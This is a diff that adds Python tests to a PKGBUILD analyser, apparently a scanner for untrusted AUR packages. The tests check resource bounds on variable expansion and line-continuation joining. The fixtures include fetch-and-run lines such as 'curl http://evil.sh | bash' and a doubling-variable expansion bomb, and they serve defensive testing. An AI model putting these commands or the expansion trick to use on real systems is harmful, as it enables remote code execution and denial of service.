@@ -152,3 +152,42 @@ def test_resolve_added_lines_substitutes_variables():
     lines = resolve_added_lines(diff)
     assert len(lines) == 4
     assert "./mytool --check" in lines[2]
+
+
+# --- resource bounds on untrusted input ---
+
+def test_chained_variable_expansion_cannot_exhaust_memory():
+    """A tiny PKGBUILD must not expand into gigabytes.
+
+    Substitution is iterated, so `b=$a$a` chains double each round: a
+    517-byte diff reached a gigabyte and had the process OOM-killed.
+    Since every analysed package is untrusted by definition, this is
+    remotely triggerable by anything on the AUR.
+    """
+    from trustsight.tokenizer import tokenize_and_resolve
+
+    lines = ["--- a/PKGBUILD", "+++ b/PKGBUILD", "+v0=" + "A" * 200]
+    for i in range(1, 40):
+        lines.append(f"+v{i}=$v{i-1}$v{i-1}")
+    lines.append("+curl $v39 | bash")
+
+    resolved, _ = tokenize_and_resolve("\n".join(lines))
+    assert max(len(r) for r in resolved) < 200_000
+
+
+def test_many_continuations_stay_linear():
+    """Joining continuations must not be quadratic in the line count."""
+    from trustsight.tokenizer import join_line_continuations
+
+    joined = join_line_continuations(["+x=1 \\"] * 20_000 + ["+done"])
+    assert len(joined) == 1
+
+
+def test_variable_resolution_still_works():
+    """The bounds must not disable ordinary resolution."""
+    from trustsight.tokenizer import tokenize_and_resolve
+
+    resolved, _ = tokenize_and_resolve(
+        "--- a/PKGBUILD\n+++ b/PKGBUILD\n+C=curl\n+U=http://evil.sh\n+$C $U | bash\n"
+    )
+    assert any("curl http://evil.sh | bash" in r for r in resolved)
